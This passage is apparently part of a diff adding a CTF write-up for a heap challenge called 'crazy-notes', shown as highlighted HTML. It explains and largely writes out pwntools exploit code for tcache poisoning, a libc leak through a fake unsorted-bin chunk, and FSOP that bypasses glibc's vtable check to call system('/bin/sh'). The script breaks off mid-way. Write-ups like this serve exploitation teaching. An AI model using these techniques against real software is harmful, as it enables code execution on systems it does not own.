+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">tierra</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">agua</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">aire</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">tierra</span><span class="p">,</span> <span class="n">agua</span><span class="p">,</span> <span class="n">aire</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">2</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">tierra</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">agua</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">aire</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">):</span>
+        <span class="n">p</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">sure</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">3</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Stats : </span><span class="sh">"</span><span class="p">)</span>
+    
+    <span class="n">num1</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s"> - </span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">num2</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s"> - </span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">num3</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="n">num1</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">rb</span><span class="sh">'</span><span class="s">\D</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">''</span><span class="p">,</span> <span class="n">num1</span><span class="p">))</span>
+    <span class="n">num2</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">rb</span><span class="sh">'</span><span class="s">\D</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">''</span><span class="p">,</span> <span class="n">num2</span><span class="p">))</span>
+    <span class="n">num3</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">rb</span><span class="sh">'</span><span class="s">\D</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">''</span><span class="p">,</span> <span class="n">num3</span><span class="p">))</span>
+    
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">num1</span><span class="o">+</span><span class="p">(</span><span class="n">num2</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="n">sure</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">fd</span>
+
+<span class="k">def</span> <span class="nf">get_first8</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">n</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">Y</span><span class="sh">"</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">rewrite_fd</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">aire</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">tierra</span>  <span class="o">=</span> <span class="n">fd</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
+    <span class="n">agua</span> <span class="o">=</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
+    <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">tierra</span><span class="p">,</span> <span class="n">agua</span><span class="p">,</span> <span class="n">aire</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">getworld</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">3</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span><span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">World : </span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">data</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Now let’s gain <strong>Arbitrary Read &amp; Write</strong>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td><td class="rouge-code"><pre><span class="nf">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">create</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="nf">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">heap_address</span> <span class="o">=</span> <span class="nf">get_first8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
+<span class="n">chunk1_address</span> <span class="o">=</span> <span class="n">heap_address</span> <span class="o">+</span> <span class="mh">0x320</span>
+<span class="n">chunk2_address</span> <span class="o">=</span> <span class="n">heap_address</span> <span class="o">+</span> <span class="mh">0x3a0</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">HEAP ADDRESS --&gt; </span><span class="sh">"</span><span class="o">+</span><span class="nf">hex</span><span class="p">(</span><span class="n">heap_address</span><span class="p">))</span>
+
+<span class="nf">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">mangled_fd</span> <span class="o">=</span> <span class="n">chunk1_address</span><span class="o">+</span><span class="mh">0x10</span> <span class="o">^</span> <span class="p">(</span><span class="n">heap_address</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">MANGLED FD --&gt; </span><span class="sh">"</span><span class="o">+</span><span class="nf">hex</span><span class="p">(</span><span class="n">mangled_fd</span><span class="p">))</span>
+<span class="nf">rewrite_fd</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">mangled_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">""</span><span class="p">)</span>
+
+<span class="nf">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Now by modifying the first 8 bytes in <strong>chunk 0</strong> we control the <strong>buffer</strong> of <strong>chunk 1</strong>. With this done, how do we leak <strong>Libc</strong>?</p>
+
+<h2 id="leaking-libc">Leaking Libc</h2>
+
+<p>Normally in <strong>heap</strong> challenges, <strong>Libc</strong> is leaked by making a <strong>chunk</strong> fall into the <strong>unsorted bin</strong>, since when a <strong>chunk</strong> falls into the unsorted bin its <strong>fd</strong> and <strong>bk</strong> point to the <strong>main arena</strong>. But here we can’t allocate a <strong>chunk</strong> large enough for it to go to the <strong>unsorted bin</strong> when freed.</p>
+
+<p>What we can do is create a <strong>fake chunk</strong> in the <strong>heap</strong>, and put its address in the <strong>buffer</strong> of a <strong>world</strong>, so that when the <strong>world</strong> is freed, our <strong>fake chunk</strong> is also freed and falls into the <strong>unsorted bin</strong>.</p>
+
+<p>A few things to keep in mind here:</p>
+<ol>
+  <li>It has to be larger than <strong>0x410</strong> so it doesn’t fall into the <strong>TCache</strong>. <em>(I’ll make it 0x500)</em></li>
+  <li>We have to create a <strong>fake guard chunk</strong> after it to prevent consolidation.</li>
+  <li>For the heap to think the <strong>guard chunk</strong> is in use, we have to create another <strong>fake chunk</strong> after it with the <strong>PREV_INUSE bit</strong> set.</li>
+</ol>
+
+<p>Graphically it would look something like this:</p>
+
+<p><img src="/assets/img/challenges/crazy-notes/heap_layout_light.png" alt="Heap Layout" /></p>
+
+<p>Once that’s done, we just read the <strong>fd</strong> of the <strong>fake chunk</strong> and we’ll have our leak!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="rouge-code"><pre><span class="n">fake_chunk_addr</span> <span class="o">=</span> <span class="n">chunk2_address</span> <span class="o">+</span> <span class="mh">0x1000</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">FAKE CHUNK ADDR --&gt; </span><span class="sh">"</span><span class="o">+</span><span class="nf">hex</span><span class="p">(</span><span class="n">fake_chunk_addr</span><span class="p">))</span>
+<span class="nf">rewrite_fd</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">fake_chunk_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">fake_chunk_hdr</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x501</span><span class="p">)</span>
+<span class="n">fake_guard</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
+
+<span class="nf">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">fake_chunk_hdr</span><span class="p">)</span>
+<span class="nf">rewrite_fd</span><span class="p">(</span><span class="mi">0</span> <span class="p">,</span><span class="n">fake_chunk_addr</span><span class="o">+</span><span class="mh">0x500</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">fake_guard</span><span class="p">)</span>
+
+<span class="nf">rewrite_fd</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk2_address</span><span class="o">+</span><span class="mh">0x10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fake_chunk_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">))</span>
+<span class="nf">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="nf">rewrite_fd</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">fake_chunk_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="nf">getworld</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">LIBC LEAK --&gt; </span><span class="sh">"</span><span class="o">+</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">))</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="gaining-code-execution">Gaining Code Execution</h2>
+
+<p>We have our <strong>libc</strong> leak — now what?</p>
+
+<p>Once we’ve reached this point there are several ways to gain <strong>Code Execution</strong>. One of them is with the <strong>tls_dtor list</strong>. I’ll leave the challenge author’s writeup using that technique here: <a href="https://gist.github.com/Iokete/edfcaf968d674d030d0d6fcfe4e12b82">Writeup with TLS_dtor list</a></p>
+
+<p>I’ll solve the challenge with <strong>FSOP</strong>. I’ll create a fake <code class="language-plaintext highlighter-rouge">struct _IO_FILE_plus</code> on the <strong>heap</strong> and put it in <code class="language-plaintext highlighter-rouge">_IO_list_all</code> so that when <code class="language-plaintext highlighter-rouge">_IO_flush_all()</code> is executed as we exit the program it calls <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>.</p>
+
+<h3 id="fsop-file-stream-oriented-programming">FSOP (File Stream Oriented Programming)</h3>
+
+<p>FSOP is a glibc exploitation technique that consists of abusing the internal structures of file streams (<code class="language-plaintext highlighter-rouge">FILE</code>, used by functions like <code class="language-plaintext highlighter-rouge">printf</code>, <code class="language-plaintext highlighter-rouge">fgets</code>, etc.) to achieve code execution.</p>
+
+<p>The idea is that glibc represents files using structures (<code class="language-plaintext highlighter-rouge">_IO_FILE</code>) that contain function pointers (vtable). If an attacker can corrupt one of these structures (for example, through a heap overflow or a Use After Free), they can redirect those pointers so that when the program invokes an operation on the stream, it ends up executing controlled code.</p>
+
+<h2 id="overwriting-the-vtable">Overwriting the vtable</h2>
+
+<p>To gain arbitrary code execution we’d need to overwrite the vtable so that when <code class="language-plaintext highlighter-rouge">_IO_flush_all()</code> calls a function in our <strong>File Struct</strong> it actually calls <code class="language-plaintext highlighter-rouge">system</code>. Here’s a diagram so you can visualize it better:</p>
+
+<p><img src="/assets/img/challenges/crazy-notes/vtable.png" alt="Diagrama _IO_FILE_plus" />
+<em>source <a href="https://pwn.college/software-exploitation/file-struct-exploits/">https://pwn.college/software-exploitation/file-struct-exploits/</a></em></p>
+
+<p>But here we run into a problem: <strong>glibc</strong> has a protection that verifies the <strong>vtable</strong> is in the <code class="language-plaintext highlighter-rouge">__libc_IO_vtables</code> section.</p>
+
+<p><em>More info at: <a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/libioP.h#L935">https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/libioP.h#L935</a></em></p>
+
+<h2 id="bypassing-the-vtable-protection"><strong>Bypassing the vtable protection</strong></h2>
+
+<p>To <strong>bypass</strong> the protection we can overwrite the <strong>vtable</strong> within the <code class="language-plaintext highlighter-rouge">__libc_IO_vtables</code> section to call <code class="language-plaintext highlighter-rouge">_IO_wfile_overflow</code>. This function then calls <code class="language-plaintext highlighter-rouge">_IO_wdoallocbuf</code> which uses an <strong>unprotected vtable</strong> in <code class="language-plaintext highlighter-rouge">FILE-&gt;wide_data</code>.</p>
+
+<p>By doing that and overwriting the <strong>vtable</strong> in <code class="language-plaintext highlighter-rouge">wide_data</code> we’ll be able to call <code class="language-plaintext highlighter-rouge">system()</code>.</p>
+
+<p>Now, how do we pass the <code class="language-plaintext highlighter-rouge">"/bin/sh"</code> string? This is relatively straightforward — when any function from the <strong>vtable</strong> is called, the pointer to the <strong>File Struct</strong> is passed as the first argument. We’d just need to put that string at the beginning of the <strong>File Struct</strong>, right?</p>
+
+<p>Well, we can’t put <code class="language-plaintext highlighter-rouge">"/bin/sh"</code> directly at the start because the <strong>flags</strong> are at the beginning of the <strong>File Struct</strong>, and we’d corrupt them in a way that <code class="language-plaintext highlighter-rouge">_IO_wfile_overflow</code> wouldn’t be called. The solution is to use the string <code class="language-plaintext highlighter-rouge">"\x3b\x01\x01\x01\x01\x01\x01\x01"</code> — this string passes the <strong>flags</strong> checks, and since <code class="language-plaintext highlighter-rouge">\x3b</code> represents a <code class="language-plaintext highlighter-rouge">";"</code>, the following string will be executed as another command.</p>
+
+<p>We also need to keep a few other things in mind:</p>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">_IO_write_ptr</code> must be greater than 0 and less than <code class="language-plaintext highlighter-rouge">_IO_write_end</code></li>
+  <li><code class="language-plaintext highlighter-rouge">_lock</code> must be a writable memory address with value 0.</li>
+</ol>
+
+<p>Our <strong>File Struct</strong> would look like this:</p>
+
+<p><img src="/assets/img/challenges/crazy-notes/fake_fileplus.png" alt="Fake File Struct" /></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre></td><td class="rouge-code"><pre><span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span><span class="o">-</span><span class="mh">0x203b20</span>
+<span class="n">io_list_all</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">_IO_list_all</span><span class="sh">"</span><span class="p">]</span>
+
+<span class="n">fake_file_addr</span> <span class="o">=</span> <span class="n">heap_address</span><span class="o">+</span><span class="mh">0x2000</span>
+<span class="n">fake_wide_vtable</span> <span class="o">=</span> <span class="n">heap_address</span><span class="o">+</span><span class="mh">0x3000</span>
+
+<span class="n">fp</span> <span class="o">=</span> <span class="nc">FileStructure</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">fp</span><span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x01</span><span class="sh">"</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="sa">b</span><span class="sh">"</span><span class="s">;</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">fp</span><span class="p">.</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">fp</span><span class="p">.</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0x1</span>
+<span class="n">fp</span><span class="p">.</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="mh">0xffffffffffffffff</span>
+<span class="n">fp</span><span class="p">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="n">heap_address</span><span class="o">+</span><span class="mh">0x1400</span>
+<span class="n">fp</span><span class="p">.</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="n">fake_wide_vtable</span><span class="o">-</span><span class="mh">0xe0</span>
+<span class="n">fp</span><span class="p">.</span><span class="n">vtable</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">_IO_wfile_jumps</span><span class="sh">"</span><span class="p">]</span>
+
+<span class="n">fp_part1</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">fp</span><span class="p">)[</span><span class="mi">0</span><span class="p">:</span><span class="mh">0x50</span><span class="p">]</span>
+<span class="n">fp_part2</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">fp</span><span class="p">)[</span><span class="mh">0x50</span><span class="p">:</span><span class="mh">0xa0</span><span class="p">]</span>
+<span class="n">fp_part3</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">fp</span><span class="p">)[</span><span class="mh">0xa0</span><span class="p">:</span><span class="mh">0x100</span><span class="p">]</span>
+
+<span class="nf">rewrite_fd</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">fake_file_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">fp_part1</span><span class="p">)</span>
+
+<span class="nf">rewrite_fd</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">fake_file_addr</span><span class="o">+</span><span class="mh">0x50</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">fp_part2</span><span class="p">)</span>
+
+<span class="nf">rewrite_fd</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">fake_file_addr</span><span class="o">+</span><span class="mh">0xa0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">fp_part3</span><span class="p">)</span>
+
+<span class="nf">rewrite_fd</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">fake_wide_vtable</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="p">)</span>
